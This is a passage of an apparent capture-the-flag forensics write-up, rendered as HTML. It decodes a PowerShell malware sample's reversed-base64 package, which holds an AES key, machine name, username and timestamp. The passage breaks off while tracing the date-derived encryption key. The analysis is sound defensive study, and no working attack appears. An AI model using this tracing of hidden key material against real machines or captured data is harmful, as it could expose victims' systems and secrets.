0IzL5AzL5_DItASOwoDMwAiPgQmb2ZWMiBHZ18Gat4Wa3BiPgI3b0Fmc0NXaulWbkFGI+AiWsZ_TkRFaupFVaNjYqZ_akpnV0RmbWVnWy40VTJjSRJ2X1cFZHZVUlhlTtQmbOBFTxQWWShFawV1V5MVUtp0STRkWxFlaORkTHZkRWRUV4ZlVOp0VnBiP\n\u003C/code>\u003C/pre>\n\u003C/section>\u003Csection class=\"heading\" data-heading-rank=\"4\" aria-labelledby=\"combinedmetadata-2yngy\">\u003Ch4 id=\"combinedmetadata-2yngy\">\u003Cspan class=\"katex\">\u003Cspan class=\"katex-mathml\">\u003Cmath xmlns=\"http://www.w3.org/1998/Math/MathML\">\u003Csemantics>\u003Cmrow>\u003Cmi>c\u003C/mi>\u003Cmi>o\u003C/mi>\u003Cmi>m\u003C/mi>\u003Cmi>b\u003C/mi>\u003Cmi>i\u003C/mi>\u003Cmi>n\u003C/mi>\u003Cmi>e\u003C/mi>\u003Cmi>d\u003C/mi>\u003Cmi>M\u003C/mi>\u003Cmi>e\u003C/mi>\u003Cmi>t\u003C/mi>\u003Cmi>a\u003C/mi>\u003Cmi>d\u003C/mi>\u003Cmi>a\u003C/mi>\u003Cmi>t\u003C/mi>\u003Cmi>a\u003C/mi>\u003Cmo stretchy=\"false\">(\u003C/mo>\u003C/mrow>\u003Cannotation encoding=\"application/x-tex\">combinedMetadata (\u003C/annotation>\u003C/semantics>\u003C/math>\u003C/span>\u003Cspan class=\"katex-html\" aria-hidden=\"true\">\u003Cspan class=\"base\">\u003Cspan class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\">\u003C/span>\u003Cspan class=\"mord mathnormal\">co\u003C/span>\u003Cspan class=\"mord mathnormal\">mbin\u003C/span>\u003Cspan class=\"mord mathnormal\">e\u003C/span>\u003Cspan class=\"mord mathnormal\">d\u003C/span>\u003Cspan class=\"mord mathnormal\" style=\"margin-right:0.10903em;\">M\u003C/span>\u003Cspan class=\"mord mathnormal\">e\u003C/span>\u003Cspan class=\"mord mathnormal\">t\u003C/span>\u003Cspan class=\"mord mathnormal\">a\u003C/span>\u003Cspan class=\"mord mathnormal\">d\u003C/span>\u003Cspan class=\"mord mathnormal\">a\u003C/span>\u003Cspan class=\"mord mathnormal\">t\u003C/span>\u003Cspan class=\"mord mathnormal\">a\u003C/span>\u003Cspan class=\"mopen\">(\u003C/span>\u003C/span>\u003C/span>\u003C/span>2YngY)\u003C/h4>\n\u003Cp>We got \u003Ccode>$XoX\u003C/code> and \u003Ccode>$2YngY\u003C/code> was encrypted with bas64 to get \u003Ccode>$XoX\u003C/code>.\u003C/p>\n\u003Cp>We could write a script to decode \u003Ccode>$XoX\u003C/code> to get the data we need.\u003C/p>\n\u003Cfigure data-rehype-pretty-code-figure=\"\">\u003Cpre style=\"--shiki-light:#0e1116;--shiki-dark:#f0f3f6;--shiki-light-bg:#ffffff;--shiki-dark-bg:#0a0c10\" tabindex=\"0\" data-language=\"python\" data-theme=\"github-light-high-contrast github-dark-high-contrast\">\u003Ccode data-language=\"python\" data-theme=\"github-light-high-contrast github-dark-high-contrast\" style=\"display: grid;\">\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">import\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> base64\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\"> \u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">def\u003C/span>\u003Cspan style=\"--shiki-light:#622CBC;--shiki-dark:#DBB7FF\"> reverse_decode\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">(strings):\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">    reversed_strings \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">=\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> strings[::\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">-\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">1\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">]\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">    replaced_strings \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">=\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> reversed_strings.replace(\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">\"-\"\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">, \u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">\"C\"\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">).replace(\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">\"_\"\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">, \u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">\"E\"\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">)\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\"> \u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">    padding \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">=\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\"> len\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">(replaced_strings) \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">%\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\"> 4\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">    if\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> padding:\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">        replaced_strings \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">+=\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> \"=\"\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\"> *\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> (\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">4\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\"> -\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> padding)\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">    \u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">    decoded \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">=\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> base64.b64decode(replaced_strings)\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">    return\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> decoded\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\"> \u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">encrypedDataPackage \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">=\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> \"0IzL5AzL5_DItASOwoDMwAiPgQmb2ZWMiBHZ18Gat4Wa3BiPgI3b0Fmc0NXaulWbkFGI+AiWsZ_TkRFaupFVaNjYqZ_akpnV0RmbWVnWy40VTJjSRJ2X1cFZHZVUlhlTtQmbOBFTxQWWShFawV1V5MVUtp0STRkWxFlaORkTHZkRWRUV4ZlVOp0VnBiP\"\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">decoded \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">=\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> reverse_decode(XoX)\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">print\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">(decoded.decode(\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">'utf-8'\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">, \u003C/span>\u003Cspan style=\"--shiki-light:#702C00;--shiki-dark:#FFB757\">errors\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">=\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">'ignore'\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">))\u003C/span>\u003C/span>\u003Cbutton type=\"button\" title=\"Copy code\" aria-label=\"Copy code\" data=\"import base64\n\ndef reverse_decode(strings):\n    reversed_strings = strings[::-1]\n    replaced_strings = reversed_strings.replace(&#x22;-&#x22;, &#x22;C&#x22;).replace(&#x22;_&#x22;, &#x22;E&#x22;)\n\n    padding = len(replaced_strings) % 4\n    if padding:\n        replaced_strings += &#x22;=&#x22; * (4 - padding)\n    \n    decoded = base64.b64decode(replaced_strings)\n    return decoded\n\nencrypedDataPackage = &#x22;0IzL5AzL5_DItASOwoDMwAiPgQmb2ZWMiBHZ18Gat4Wa3BiPgI3b0Fmc0NXaulWbkFGI+AiWsZ_TkRFaupFVaNjYqZ_akpnV0RmbWVnWy40VTJjSRJ2X1cFZHZVUlhlTtQmbOBFTxQWWShFawV1V5MVUtp0STRkWxFlaORkTHZkRWRUV4ZlVOp0VnBiP&#x22;\ndecoded = reverse_decode(XoX)\nprint(decoded.decode(&#x27;utf-8&#x27;, errors=&#x27;ignore&#x27;))\" class=\"rehype-pretty-copy\" onclick=\"navigator.clipboard.writeText(this.attributes.data.value);this.classList.add(&#x27;rehype-pretty-copied&#x27;);window.setTimeout(() => this.classList.remove(&#x27;rehype-pretty-copied&#x27;), 1000);\">\u003Cspan class=\"ready\">\u003C/span>\u003Cspan class=\"success\">\u003C/span>\u003C/button>\u003Cstyle>:root {--copy-icon: url(\"data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 48 48'%3E%3Cpath fill='%23adadad' d='M16.187 9.5H12.25a1.75 1.75 0 0 0-1.75 1.75v28.5c0 .967.784 1.75 1.75 1.75h23.5a1.75 1.75 0 0 0 1.75-1.75v-28.5a1.75 1.75 0 0 0-1.75-1.75h-3.937a4.25 4.25 0 0 1-4.063 3h-7.5a4.25 4.25 0 0 1-4.063-3M31.813 7h3.937A4.25 4.25 0 0 1 40 11.25v28.5A4.25 4.25 0 0 1 35.75 44h-23.5A4.25 4.25 0 0 1 8 39.75v-28.5A4.25 4.25 0 0 1 12.25 7h3.937a4.25 4.25 0 0 1 4.063-3h7.5a4.25 4.25 0 0 1 4.063 3M18.5 8.25c0 .966.784 1.75 1.75 1.75h7.5a1.75 1.75 0 1 0 0-3.5h-7.5a1.75 1.75 0 0 0-1.75 1.75'/%3E%3C/svg%3E\");--success-icon: url(\"data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'%3E%3Cpath fill='%2366ff85' d='M9 16.17L5.53 12.7a.996.996 0 1 0-1.41 1.41l4.18 4.18c.39.39 1.02.39 1.41 0L20.29 7.71a.996.996 0 1 0-1.41-1.41z'/%3E%3C/svg%3E\");}pre:has(code) {position: relative;}pre button.rehype-pretty-copy {right: 1px;padding: 0;width: 24px;height: 24px;display: flex;margin-top: 2px;margin-right: 8px;position: absolute;border-radius: 25%;backdrop-filter: blur(3px);& span {width: 100%;aspect-ratio: 1 / 1;}& .ready {background-image: var(--copy-icon);}& .success {display: none; background-image: var(--success-icon);}}&.rehype-pretty-copied {& .success {display: block;} & .ready {display: none;}}pre button.rehype-pretty-copy.rehype-pretty-copied {opacity: 1;& .ready { display: none; }& .success { display: block; }}pre button.rehype-pretty-copy { opacity: 0; }figure[data-rehype-pretty-code-figure]:hover > pre > code button.rehype-pretty-copy {opacity: 1;}\u003C/style>\u003C/code>\u003C/pre>\u003C/figure>\n\u003Cfigure data-rehype-pretty-code-figure=\"\">\u003Cpre style=\"--shiki-light:#0e1116;--shiki-dark:#f0f3f6;--shiki-light-bg:#ffffff;--shiki-dark-bg:#0a0c10\" tabindex=\"0\" data-language=\"powershell\" data-theme=\"github-light-high-contrast github-dark-high-contrast\">\u003Ccode data-language=\"powershell\" data-theme=\"github-light-high-contrast github-dark-high-contrast\" style=\"display: grid;\">\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">python .\\B64Reverse.py\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">>\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> gWJNVVxUDVFFGNDNjQqZDSKJmQS9WUphXRYd1LPNnd\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">-\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">NXeQVGdW5_bQJ2SWN2ZuVndtVzdhFjb3ZTZnhTdLFlZ \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">>\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> administrator \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">>\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> win\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">-\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">ho5dpb1fvnd \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">>\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\"> 00\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">:\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">09\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\"> -\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\"> 19\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">/\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">09\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">/\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">24\u003C/span>\u003C/span>\u003Cbutton type=\"button\" title=\"Copy code\" aria-label=\"Copy code\" data=\"python .\\B64Reverse.py\n> gWJNVVxUDVFFGNDNjQqZDSKJmQS9WUphXRYd1LPNnd-NXeQVGdW5_bQJ2SWN2ZuVndtVzdhFjb3ZTZnhTdLFlZ > administrator > win-ho5dpb1fvnd > 00:09 - 19/09/24\" class=\"rehype-pretty-copy\" onclick=\"navigator.clipboard.writeText(this.attributes.data.value);this.classList.add(&#x27;rehype-pretty-copied&#x27;);window.setTimeout(() => this.classList.remove(&#x27;rehype-pretty-copied&#x27;), 1000);\">\u003Cspan class=\"ready\">\u003C/span>\u003Cspan class=\"success\">\u003C/span>\u003C/button>\u003Cstyle>:root {--copy-icon: url(\"data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 48 48'%3E%3Cpath fill='%23adadad' d='M16.187 9.5H12.25a1.75 1.75 0 0 0-1.75 1.75v28.5c0 .967.784 1.75 1.75 1.75h23.5a1.75 1.75 0 0 0 1.75-1.75v-28.5a1.75 1.75 0 0 0-1.75-1.75h-3.937a4.25 4.25 0 0 1-4.063 3h-7.5a4.25 4.25 0 0 1-4.063-3M31.813 7h3.937A4.25 4.25 0 0 1 40 11.25v28.5A4.25 4.25 0 0 1 35.75 44h-23.5A4.25 4.25 0 0 1 8 39.75v-28.5A4.25 4.25 0 0 1 12.25 7h3.937a4.25 4.25 0 0 1 4.063-3h7.5a4.25 4.25 0 0 1 4.063 3M18.5 8.25c0 .966.784 1.75 1.75 1.75h7.5a1.75 1.75 0 1 0 0-3.5h-7.5a1.75 1.75 0 0 0-1.75 1.75'/%3E%3C/svg%3E\");--success-icon: url(\"data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'%3E%3Cpath fill='%2366ff85' d='M9 16.17L5.53 12.7a.996.996 0 1 0-1.41 1.41l4.18 4.18c.39.39 1.02.39 1.41 0L20.29 7.71a.996.996 0 1 0-1.41-1.41z'/%3E%3C/svg%3E\");}pre:has(code) {position: relative;}pre button.rehype-pretty-copy {right: 1px;padding: 0;width: 24px;height: 24px;display: flex;margin-top: 2px;margin-right: 8px;position: absolute;border-radius: 25%;backdrop-filter: blur(3px);& span {width: 100%;aspect-ratio: 1 / 1;}& .ready {background-image: var(--copy-icon);}& .success {display: none; background-image: var(--success-icon);}}&.rehype-pretty-copied {& .success {display: block;} & .ready {display: none;}}pre button.rehype-pretty-copy.rehype-pretty-copied {opacity: 1;& .ready { display: none; }& .success { display: block; }}pre button.rehype-pretty-copy { opacity: 0; }figure[data-rehype-pretty-code-figure]:hover > pre > code button.rehype-pretty-copy {opacity: 1;}\u003C/style>\u003C/code>\u003C/pre>\u003C/figure>\n\u003Cp>Remember \u003Ccode> $combinedMetadata = \"> $encodedAesKey > $machineName > $username > $formattedDateTime\"\u003C/code> thus we could see that:\u003C/p>\n\u003Cul>\n\u003Cli>\u003Ccode>$encodedAesKey\u003C/code>: gWJNVVxUDVFFGNDNjQqZDSKJmQS9WUphXRYd1LPNnd-NXeQVGdW5_bQJ2SWN2ZuVndtVzdhFjb3ZTZnhTdLFlZ\u003C/li>\n\u003Cli>\u003Ccode>$machineName\u003C/code>: administrator\u003C/li>\n\u003Cli>\u003Ccode>$username\u003C/code>: win-ho5dpb1fvnd\u003C/li>\n\u003Cli>\u003Ccode>$formattedDateTime\u003C/code>: 00:09 - 19/09/24\u003C/li>\n\u003C/ul>\n\u003C/section>\u003Csection class=\"heading\" data-heading-rank=\"4\" aria-labelledby=\"encryptedaeskey-cvf\">\u003Ch4 id=\"encryptedaeskey-cvf\">\u003Cspan class=\"katex\">\u003Cspan class=\"katex-mathml\">\u003Cmath xmlns=\"http://www.w3.org/1998/Math/MathML\">\u003Csemantics>\u003Cmrow>\u003Cmi>e\u003C/mi>\u003Cmi>n\u003C/mi>\u003Cmi>c\u003C/mi>\u003Cmi>r\u003C/mi>\u003Cmi>y\u003C/mi>\u003Cmi>p\u003C/mi>\u003Cmi>t\u003C/mi>\u003Cmi>e\u003C/mi>\u003Cmi>d\u003C/mi>\u003Cmi>A\u003C/mi>\u003Cmi>e\u003C/mi>\u003Cmi>s\u003C/mi>\u003Cmi>K\u003C/mi>\u003Cmi>e\u003C/mi>\u003Cmi>y\u003C/mi>\u003Cmo stretchy=\"false\">(\u003C/mo>\u003C/mrow>\u003Cannotation encoding=\"application/x-tex\">encryptedAesKey (\u003C/annotation>\u003C/semantics>\u003C/math>\u003C/span>\u003Cspan class=\"katex-html\" aria-hidden=\"true\">\u003Cspan class=\"base\">\u003Cspan class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\">\u003C/span>\u003Cspan class=\"mord mathnormal\">e\u003C/span>\u003Cspan class=\"mord mathnormal\">n\u003C/span>\u003Cspan class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">cry\u003C/span>\u003Cspan class=\"mord mathnormal\">pt\u003C/span>\u003Cspan class=\"mord mathnormal\">e\u003C/span>\u003Cspan class=\"mord mathnormal\">d\u003C/span>\u003Cspan class=\"mord mathnormal\">A\u003C/span>\u003Cspan class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">esKey\u003C/span>\u003Cspan class=\"mopen\">(\u003C/span>\u003C/span>\u003C/span>\u003C/span>cvf)\u003C/h4>\n\u003Cp>And \u003Ccode>$encodedAesKey\u003C/code> also base64 encoded from \u003Ccode>$encryptedAesKey\u003C/code>. Reuse the script to get what we need.\u003C/p>\n\u003Cfigure data-rehype-pretty-code-figure=\"\">\u003Cpre style=\"--shiki-light:#0e1116;--shiki-dark:#f0f3f6;--shiki-light-bg:#ffffff;--shiki-dark-bg:#0a0c10\" tabindex=\"0\" data-language=\"powershell\" data-theme=\"github-light-high-contrast github-dark-high-contrast\">\u003Ccode data-language=\"powershell\" data-theme=\"github-light-high-contrast github-dark-high-contrast\" style=\"display: grid;\">\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">python \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">-\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">u \u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">\"e:\\CTF\\UrgentTina SVATTT\\B64Reverse.py\"\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">fQKu8ge6wn1aw5mvungcVKbPlNVtePysBvsO\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">/\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">WXExiQoRBbJH6jB3C4aET51USIZ\u003C/span>\u003C/span>\u003Cbutton type=\"button\" title=\"Copy code\" aria-label=\"Copy code\" data=\"python -u &#x22;e:\\CTF\\UrgentTina SVATTT\\B64Reverse.py&#x22;\nfQKu8ge6wn1aw5mvungcVKbPlNVtePysBvsO/WXExiQoRBbJH6jB3C4aET51USIZ\" class=\"rehype-pretty-copy\" onclick=\"navigator.clipboard.writeText(this.attributes.data.value);this.classList.add(&#x27;rehype-pretty-copied&#x27;);window.setTimeout(() => this.classList.remove(&#x27;rehype-pretty-copied&#x27;), 1000);\">\u003Cspan class=\"ready\">\u003C/span>\u003Cspan class=\"success\">\u003C/span>\u003C/button>\u003Cstyle>:root {--copy-icon: url(\"data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 48 48'%3E%3Cpath fill='%23adadad' d='M16.187 9.5H12.25a1.75 1.75 0 0 0-1.75 1.75v28.5c0 .967.784 1.75 1.75 1.75h23.5a1.75 1.75 0 0 0 1.75-1.75v-28.5a1.75 1.75 0 0 0-1.75-1.75h-3.937a4.25 4.25 0 0 1-4.063 3h-7.5a4.25 4.25 0 0 1-4.063-3M31.813 7h3.937A4.25 4.25 0 0 1 40 11.25v28.5A4.25 4.25 0 0 1 35.75 44h-23.5A4.25 4.25 0 0 1 8 39.75v-28.5A4.25 4.25 0 0 1 12.25 7h3.937a4.25 4.25 0 0 1 4.063-3h7.5a4.25 4.25 0 0 1 4.063 3M18.5 8.25c0 .966.784 1.75 1.75 1.75h7.5a1.75 1.75 0 1 0 0-3.5h-7.5a1.75 1.75 0 0 0-1.75 1.75'/%3E%3C/svg%3E\");--success-icon: url(\"data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'%3E%3Cpath fill='%2366ff85' d='M9 16.17L5.53 12.7a.996.996 0 1 0-1.41 1.41l4.18 4.18c.39.39 1.02.39 1.41 0L20.29 7.71a.996.996 0 1 0-1.41-1.41z'/%3E%3C/svg%3E\");}pre:has(code) {position: relative;}pre button.rehype-pretty-copy {right: 1px;padding: 0;width: 24px;height: 24px;display: flex;margin-top: 2px;margin-right: 8px;position: absolute;border-radius: 25%;backdrop-filter: blur(3px);& span {width: 100%;aspect-ratio: 1 / 1;}& .ready {background-image: var(--copy-icon);}& .success {display: none; background-image: var(--success-icon);}}&.rehype-pretty-copied {& .success {display: block;} & .ready {display: none;}}pre button.rehype-pretty-copy.rehype-pretty-copied {opacity: 1;& .ready { display: none; }& .success { display: block; }}pre button.rehype-pretty-copy { opacity: 0; }figure[data-rehype-pretty-code-figure]:hover > pre > code button.rehype-pretty-copy {opacity: 1;}\u003C/style>\u003C/code>\u003C/pre>\u003C/figure>\n\u003Cp>\u003Ccode>$encryptedAesKey\u003C/code> was the result of the AES encryption. We need to find the key which was \u003Ccode>$derivedKeyFromDateTime\u003C/code>\u003C/p>\n\u003C/section>\u003Csection class=\"heading\" data-heading-rank=\"4\" aria-labelledby=\"derivedkeyfromdatetime-uz19o\">\u003Ch4 id=\"derivedkeyfromdatetime-uz19o\">\u003Cspan class=\"katex\">\u003Cspan class=\"katex-mathml\">\u003Cmath xmlns=\"http://www.w3.org/1998/Math/MathML\">\u003Csemantics>\u003Cmrow>\u003Cmi>d\u003C/mi>\u003Cmi>e\u003C/mi>\u003Cmi>r\u003C/mi>\u003Cmi>i\u003C/mi>\u003Cmi>v\u003C/mi>\u003Cmi>e\u003C/mi>\u003Cmi>d\u003C/mi>\u003Cmi>K\u003C/mi>\u003Cmi>e\u003C/mi>\u003Cmi>y\u003C/mi>\u003Cmi>F\u003C/mi>\u003Cmi>r\u003C/mi>\u003Cmi>o\u003C/mi>\u003Cmi>m\u003C/mi>\u003Cmi>D\u003C/mi>\u003Cmi>a\u003C/mi>\u003Cmi>t\u003C/mi>\u003Cmi>e\u003C/mi>\u003Cmi>T\u003C/mi>\u003Cmi>i\u003C/mi>\u003Cmi>m\u003C/mi>\u003Cmi>e\u003C/mi>\u003Cmo stretchy=\"false\">(\u003C/mo>\u003C/mrow>\u003Cannotation encoding=\"application/x-tex\">derivedKeyFromDateTime (\u003C/annotation>\u003C/semantics>\u003C/math>\u003C/span>\u003Cspan class=\"katex-html\" aria-hidden=\"true\">\u003Cspan class=\"base\">\u003Cspan class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\">\u003C/span>\u003Cspan class=\"mord mathnormal\">d\u003C/span>\u003Cspan class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">er\u003C/span>\u003Cspan class=\"mord mathnormal\">i\u003C/span>\u003Cspan class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">v\u003C/span>\u003Cspan class=\"mord mathnormal\">e\u003C/span>\u003Cspan class=\"mord mathnormal\">d\u003C/span>\u003Cspan class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">Key\u003C/span>\u003Cspan class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">F\u003C/span>\u003Cspan class=\"mord mathnormal\">ro\u003C/span>\u003Cspan class=\"mord mathnormal\">m\u003C/span>\u003Cspan class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">D\u003C/span>\u003Cspan class=\"mord mathnormal\">a\u003C/span>\u003Cspan class=\"mord mathnormal\">t\u003C/span>\u003Cspan class=\"mord mathnormal\">e\u003C/span>\u003Cspan class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">T\u003C/span>\u003Cspan class=\"mord mathnormal\">im\u003C/span>\u003Cspan class=\"mord mathnormal\">e\u003C/span>\u003Cspan class=\"mopen\">(\u003C/span>\u003C/span>\u003C/span>\u003C/span>Uz19o)\u003C/h4>\n\u003Cp>\u003Ccode>Ctrl\u003C/code> + \u003Ccode>F\u003C/code> with \u003Ccode>$Uz19o\u003C/code> give us where we could get the value for this variable.\u003C/p>\n\u003Cfigure data-rehype-pretty-code-figure=\"\">\u003Cpre style=\"--shiki-light:#0e1116;--shiki-dark:#f0f3f6;--shiki-light-bg:#ffffff;--shiki-dark-bg:#0a0c10\" tabindex=\"0\" data-language=\"powershell\" data-theme=\"github-light-high-contrast github-dark-high-contrast\">\u003Ccode data-language=\"powershell\" data-theme=\"github-light-high-contrast github-dark-high-contrast\" style=\"display: grid;\">\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$OgE \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">=\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> ([\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">Environment\u003C/span>\u003Cspan 